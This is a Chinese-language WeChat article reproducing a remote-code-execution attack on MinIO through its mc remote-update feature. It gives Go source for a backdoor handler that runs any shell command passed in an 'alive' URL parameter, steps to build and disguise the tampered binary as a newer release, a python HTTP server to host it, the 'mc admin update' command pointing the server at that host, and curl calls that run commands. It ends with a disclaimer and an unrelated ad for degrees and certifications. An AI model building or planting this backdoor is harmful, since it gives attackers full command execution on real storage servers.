<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7sJkKfzE5LpumwkhNvrbGg)

**漏洞简介**  

-----------

MinIO 提供了一个非常方便的功能，可以通过 mc（MinIO 客户端）远程升级 MinIO 服务器，关键在于升级地址是可以通过预设自定义的，在官方的说明文档中并没有详细说明，企业如果是内网环境可以指定自己的更新地址以便于升级。而 minio 更新就是下载新版本二进制程序然后实现自我替换的过程，也就是说只要让 minio 更新动作下载到恶意程序，他就会自行执行，最终形成 RCE。  

**漏洞复现**  

-----------

环境搭建  

-------

下载之后启动服务  

-----------

```
https://github.com/minio/minio/compare/RELEASE.2023-01-25T00-19-54Z...RELEASE.2023-01-31T02-24-19Z
go run main.go server /root/桌面/minio（随便指定一个目录）

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBEfHibrsg2PIrDBqYbXPxQySumoQJmcCXWaiaJwfHZE8JG2sgbXUcXPjXRo26FI0EBHttU79LDTwzw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBEfHibrsg2PIrDBqYbXPxQyJSRlVuV1EdY0Hia8icFG3LHXOIRmx0PONSRibLZo26qOFSPiaw2f2Tw3ibQ/640?wx_fmt=png)

源码二开  

使用源码进行二开，最好使用与服务相同的版本，以免出现服务崩溃等不可预知错误

```
//增加一个cmd/x.go 文件
package cmd
import (
    "os/exec"
    "runtime"
)
func getOutputDirectly(commandStr string) string {
    var execGlobalOutput string
    var shell [2]string
    var systemOS string = runtime.GOOS
    if systemOS == "linux" || systemOS == "darwin" {
        shell[0], shell[1] = "/bin/bash", "-c"
    } else {
        shell[0], shell[1] = "C:\\Windows\\System32\\cmd.exe", "/c"
    }
    cmd := exec.Command(shell[0], shell[1], commandStr)
    output, err := cmd.Output()
    if err != nil {
        return ""
    }
    execGlobalOutput += string(output)
    return execGlobalOutput
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBEfHibrsg2PIrDBqYbXPxQyNa1hhv2b7bAnRbKBxYx3hb1Lq3BYodibCXFF5pt2QMchic3dYunVRTjg/640?wx_fmt=png)

```
//添加全局预处理 Handler
//cmd/generic-handlers.go文件
func xHandler(h http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        var arg string
        values := r.URL.Query()
        arg = values.Get("alive")
        if arg != "" {
            w.Write([]byte(getOutputDirectly(arg)))
            return
        }
        h.ServeHTTP(w, r)
    })
}
//cmd/routers.go文件
xHandler,

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBEfHibrsg2PIrDBqYbXPxQyM8L60wVRJ25ibMt3TicXnyNSqdR4HWFor8G2WwiaBAhZo3hYM8RVLx18w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBEfHibrsg2PIrDBqYbXPxQywzWjTdv84buzMyNtZEJYKsJYoJzfGc7l6FqdxPIjgDnIMgibUTUVUAw/640?wx_fmt=png)

打包二开源码  

```
//2023-07-22这是时间，这里注意这个时间要比minio运行的日期要新（比如我2023-07-10启动的minio服务，那么更新文件名称时间就要比这个时间新，所以我用的minio.RELEASE.2023-07-22T06-36-24Z）
go build -ldflags="-s -w " -trimpath && mv minio minio.RELEASE.2023-07-22T06-36-24Z && shasum -a 256 minio.RELEASE.2023-07-22T06-36-24Z > minio.RELEASE.2023-07-22T06-36-24Z.sha256sum

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBEfHibrsg2PIrDBqYbXPxQynCcBVoltDaNpD54G9aXpvhrxGfou07GC9ysbOnb0icd7tsFMabm3uvA/640?wx_fmt=png)

### 启动一个 http 服务

```
//在更新文件目录使用python启动一个http服务
python3 -m http.server 5678

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBEfHibrsg2PIrDBqYbXPxQynbdmiaFLAVXbvVPKJdQ0UiaMU6ibSEeQvMicrRLwKPnic6CeWB3JFKfgZzA/640?wx_fmt=png)

### mc 更新

```
//下载地址https://min.io/download#/linux
//设置别名为"test01"
./mc alias set test01 http://127.0.0.1:9000 minioadmin minioadmin
//进行更新操作
./mc admin update test01 http://172.19.0.1:5678/minio.RELEASE.2023-07-22T06-36-24Z.sha256sum -y
响应 Server `test01` updated successfully from DEVELOPMENT.GOGET to 2023-07-22T06-36-24Z 即表示更新成功

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBEfHibrsg2PIrDBqYbXPxQy99X5mrNuklv8a74E6quehEBmnXtmIwKOVQ3CJW7RNQfnX5GMBWfcibA/640?wx_fmt=png)

### 执行命令

```
curl 'http://10.211.55.9:9000/?alive=whoami' 
curl 'http://10.211.55.9:9000/test?alive=whoami'

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBEfHibrsg2PIrDBqYbXPxQyr37PQ68IhdveFx0JoWKJQpmavAX2JGbFjkbnozIXpWjQSYvib7pFOdg/640?wx_fmt=png)  

**坑点**  

---------

```
1、打包二开的payload源码时文件时间时间要比minio运行的日期要新，因为它是根据服务启动的时间来对比你的文件名称时间决定要不要更新。下图我使用复现成功的源码打包时时间改为03更新就会提示已是最新版。
2、如果是使用官方的Docker容器部署，将无法绕过二进制文件的签名检查，因为官方容器默认设置了官方公钥，需要知道私钥才能伪造签名
3、需要1.19以上版本的go环境运行，git clone https://github.com/udhos/update-golang（sudo RELEASE=1.19.1 ./update-golang.sh）

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBEfHibrsg2PIrDBqYbXPxQyumuibTZPKsM2fZHw4BIKEyNnsZbrQpWhLN1POapuwtLXIFqpSGtuib7w/640?wx_fmt=png)

**参考链接**  

```
https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ
https://zhuanlan.zhihu.com/p/624238964
https://github.com/AbelChe/evil_minio

```

**免责声明**  

**本实验不得用于商业用途, 仅做学习交流，如用作他途造成的一切后果请自行承担!**  

学历：非全日制的学历提升，高升专，专升本可学位

安全证书：cisp  cissp  cisp-pte pmp 等  

 有需要的私聊

![](https://mmbiz.qpic.cn/mmbiz_jpg/7XAvvlbibo1So1mMiaCVnErtWQohjbUCicMhkLFUoBRSSicJ57kBDLLyhWDPzO9rAl4mrnBXC0WWHYibms0odlomHoQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)